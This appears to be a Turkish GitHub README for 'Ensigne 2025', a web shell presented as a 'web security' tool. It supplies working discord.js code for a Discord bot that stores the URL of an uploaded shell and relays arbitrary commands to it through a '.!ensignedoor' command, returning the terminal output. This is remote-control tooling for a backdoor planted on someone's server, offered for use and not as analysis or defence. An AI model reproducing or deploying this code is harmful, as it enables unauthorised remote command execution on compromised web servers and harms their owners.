Ensigne 2025 Web Güvenliği İçin Yazılmış Açık Kaynak Kodlu Bir Shelldir.

İletişim İçin Discord: ensigne

![image](https://github.com/user-attachments/assets/33c11505-acfc-492d-9cb3-3c48b5496d62)


Sistem ayrıca discord.js uyumludur. Bot oluşturup sohbete **.!backlink <url(yüklediğiniz shellin linki)> ** yaptıktan sonra **.!ensignedoor <komut>** ile discord üzerindende shelli kontrol edebilirsiniz.

**İŞTE DİSCORD JS KODLARI**

```
const { Client, Intents } = require('discord.js');
const fetch = require('node-fetch');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });

const token = 'YOUR_BOT_TOKEN';  // Bot tokenınızı buraya yazın

const userBackendUrls = {};

client.once('ready', () => {
    console.log('Bot hazır!');
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return; 

  
    if (message.content.startsWith('.!backlink')) {
        const url = message.content.replace('.!backlink ', '').trim();
        if (url) {
            userBackendUrls[message.author.id] = url;  
            message.reply(`Backend URL'si başarıyla ayarlandı: ${url}`);
        } else {
            message.reply('Lütfen geçerli bir URL girin.');
        }
    }

    
    if (message.content.startsWith('.!ensignedoor')) {
        const userId = message.author.id;
        const url = userBackendUrls[userId];

        if (!url) {
            return message.reply('Önce backend URL\'sini ayarlamanız gerekiyor. Lütfen .!backlink <URL> komutunu kullanın.');
        }

        const command = message.content.replace('.!ensignedoor ', '');  
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    command: command
                })
            });

            const data = await response.text();  
            message.reply(`Terminal Çıktısı:\n${data}`);  

        } catch (error) {
            console.error('Komut gönderme hatası:', error);
            message.reply('Bir hata oluştu, lütfen tekrar deneyin.');
        }
    }
});

client.login(token);
```
